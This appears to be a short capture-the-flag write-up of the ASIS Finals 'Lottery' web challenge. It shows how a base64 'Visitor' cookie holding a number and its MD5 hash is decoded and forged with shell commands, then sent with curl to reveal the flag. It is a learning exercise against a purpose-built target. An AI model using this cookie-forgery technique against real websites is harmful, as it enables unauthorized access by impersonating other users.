### Solved by barrebas

Lottery was a 100 point web challenge in the ASIS Finals CTF. The description only said 'Go here: http://asis-ctf.ir:12437'. That webpage was mostly non-functional, but said that the 1234567890th visitor would win a *prize*. Gee, I wonder what that is? My browser informed me that there were no cookies, but I wasn't convinced.

![](/images/2014/asis-finals/lottery/01.png)

I turned to ```curl```. Luckily, curl informed me that there was indeed a cookie been set. A cookie named 'Visitor', no less:

![](/images/2014/asis-finals/lottery/02.png)

The value looked like base64 so I decoded it:

```
$ echo -ne 'MTM4NjozNjM3NjNlNWMzZGMzYTY4YjM5OTA1OGMzNGFlY2YyYw==' |base64 -d
1386:363763e5c3dc3a68b399058c34aecf2c
```

Hmm. I figured that first number was a visitor number. What could the second string be? MD5 maybe?

```
$ echo -ne 1386 |md5sum
363763e5c3dc3a68b399058c34aecf2c  -
```

Spot on. It's now easy to fake the right cookie:

```
$ echo -ne 1234567890 |md5sum
e807f1fcf82d132f9bb018ca6738a19f  -
$ echo -ne '1234567890:e807f1fcf82d132f9bb018ca6738a19f' |base64
MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg==
```

And feed it into curl:

```
$ curl -v http://asis-ctf.ir:12437/ --cookie "Visitor=MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg=="
* About to connect() to asis-ctf.ir port 12437 (#0)
*   Trying 87.107.124.12...
* connected
* Connected to asis-ctf.ir (87.107.124.12) port 12437 (#0)
> GET / HTTP/1.1
> User-Agent: curl/7.26.0
> Host: asis-ctf.ir:12437
> Accept: */*
> Cookie: Visitor=MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg==
>
...snip...
Google+"></a> </div></div><div class="data-wrapper"><p class="title">The 1234567890 th visitor, the prize awarded.</p><div class="content">Anyone who has visited our site is the 1234567890 th Special prizes are awarded. <br/>the flag is: ASIS_9f1af649f25108144fc38a01f8767c0c</div></div><div class="footer"><div class="p
```

The flag is ```ASIS_9f1af649f25108144fc38a01f8767c0c```. Easy!


